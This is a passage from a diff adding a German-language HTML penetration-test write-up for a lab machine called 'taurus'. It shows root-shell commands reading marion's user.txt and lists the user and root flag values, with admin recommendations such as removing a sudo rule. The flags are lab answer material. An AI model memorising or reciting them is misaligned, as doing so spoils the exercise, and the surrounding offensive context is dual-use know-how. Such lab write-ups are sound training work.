+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Zugriff bestätigt. Überprüfen Sie die User-Flag im Home-Verzeichnis von `marion`.<br><strong>Empfehlung (Admin):</strong> `sudo`-Regel entfernen. Überprüfen Sie die Sicherheit von SSH-Schlüsseln.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">root@taurus:~# <span class="command">cd /home/marion/</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt">root@taurus:/home/marion# <span class="command">ls</span></div>
+                    <pre>user.txt</pre>
+                    <div class="prompt">root@taurus:/home/marion# <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">17f97ddf297442c5ecf0230a8db97e9b</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Root wird in das Home-Verzeichnis von `marion` gewechselt und die Datei `user.txt` ausgelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag wurde erfolgreich extrahiert (obwohl sie technisch gesehen dem Benutzer `marion` zugeordnet ist).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beide Flags gefunden. Bericht abschließen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bezüglich der Flag.</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/marion/user.txt</div>
+                    <div class="flag-value"><span class="password">17f97ddf297442c5ecf0230a8db97e9b</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt (via ptar extraction)</div>
+                    <div class="flag-value"><span class="password">f3c6d27bbd3e9cf452c6c4258d316ce0</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 8. Oktober 2022</p> <!-- Korrektes Datum aus Nmap/SNMP extrahiert -->
+    </footer>
+</body>
+</html>
